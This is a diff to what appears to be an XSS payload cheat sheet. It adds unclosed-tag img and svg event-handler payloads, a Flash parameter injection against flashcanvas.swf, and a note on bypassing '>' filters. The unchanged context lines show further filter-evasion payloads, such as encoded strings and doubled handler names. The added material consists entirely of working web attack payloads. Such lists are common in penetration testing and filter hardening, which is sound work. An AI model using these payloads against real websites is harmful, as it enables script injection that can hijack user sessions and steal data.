@@ -34,6 +34,7 @@ Basic payload
 
 Img payload
 <img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
 <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
@@ -43,6 +44,7 @@ Img payload
 Svg payload
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
+<svg onload=alert(1)//
 <svg/onload=alert(String.fromCharCode(88,83,83))>
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
@@ -92,6 +94,7 @@ banner.swf?clickTAG=javascript:alert(1);//
 io.swf?yid=\"));}catch(e){alert(1);}//
 video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
 bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
 ```
 
 XSS in Hidden input
@@ -496,6 +499,10 @@ XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
 XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
+Bypass ">" using nothing #trololo (you don't need to close your tags)
+```
+<svg onload=alert(1)//
+```
 
 Bypass ';' using another character
 ```
